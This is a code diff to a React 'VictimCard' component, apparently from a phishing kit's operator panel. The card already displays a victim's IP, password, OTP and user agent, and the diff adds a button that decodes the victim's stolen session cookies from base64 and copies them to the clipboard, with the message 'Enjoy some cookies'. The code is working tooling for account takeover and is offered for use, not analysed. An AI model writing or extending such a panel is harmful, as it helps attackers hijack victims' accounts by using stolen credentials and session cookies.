@@ -27,6 +27,7 @@ export default function VictimCard({
   password,
   action,
   user_agent,
+  Cookies,
 }) {
   const [curr_OTP, setCurrOTP] = useState(0);
   useEffect(() => {
@@ -38,6 +39,30 @@ export default function VictimCard({
     setCurrAction(action);
   }, [action]);
 
+  const [curr_Cookies, setCurrCookies] = useState(0);
+  useEffect(() => {
+    setCurrCookies(Cookies);
+  }, [Cookies]);
+  
+    const copyCookie = (e) => {
+      let buff = new Buffer(curr_Cookies, 'base64');
+      let text = buff.toString('ascii');
+      navigator.clipboard.writeText(text);
+      toast.success(`Enjoy some cookies 🍪`);
+    }
+
+
+    const CookiesSwticher = () => {
+      if (curr_Cookies == "None") {
+        return ;
+      } else {
+        return (
+          <Button onPress={copyCookie} color="default" className="size-fit text-gray-900 bg-white hover:bg-gray-100 border border-gray-200 focus:ring-4 focus:outline-none focus:ring-gray-100 font-medium rounded-lg text-sm px-5 py-2.5 text-center inline-flex items-center dark:focus:ring-gray-600 dark:bg-gray-800 dark:border-gray-700 dark:text-white dark:hover:bg-gray-700 me-2 mb-2">
+          Copy 🍪 to 📋
+        </Button>
+        );
+      }
+    };
   const router = useRouter();
   const sendToError = async () => {
     try {
@@ -106,12 +131,17 @@ export default function VictimCard({
     <Card className="max-w-[600px] bg-slate-800 m-2 rounded-xl content-center ">
       <CardHeader className="flex gap-3">
         <div className="flex flex-col text-left">
-          <p className="text-md">
-            <span className="text-sky-500">ID:</span> {id}
-          </p>
-          <p className="text-md">
-            <span className="text-sky-500">IP:</span> {ip}
-          </p>
+          <div className="flex flex-row justify-between">
+            <div>
+              <p className="text-md">
+                <span className="text-sky-500">ID:</span> {id}
+              </p>
+              <p className="text-md">
+                <span className="text-sky-500">IP:</span> {ip}
+              </p>
+            </div>
+            {CookiesSwticher()}
+          </div>
           <p className="text-md">
             <span className="text-sky-500"> user_agent: </span>
             {user_agent}
@@ -132,6 +162,8 @@ export default function VictimCard({
         <p>
           <span className="text-sky-500">OTP:</span> {curr_OTP}
         </p>
+      
+
       </CardBody>
       <Divider />
       <CardFooter className="flex justify-between content-center">
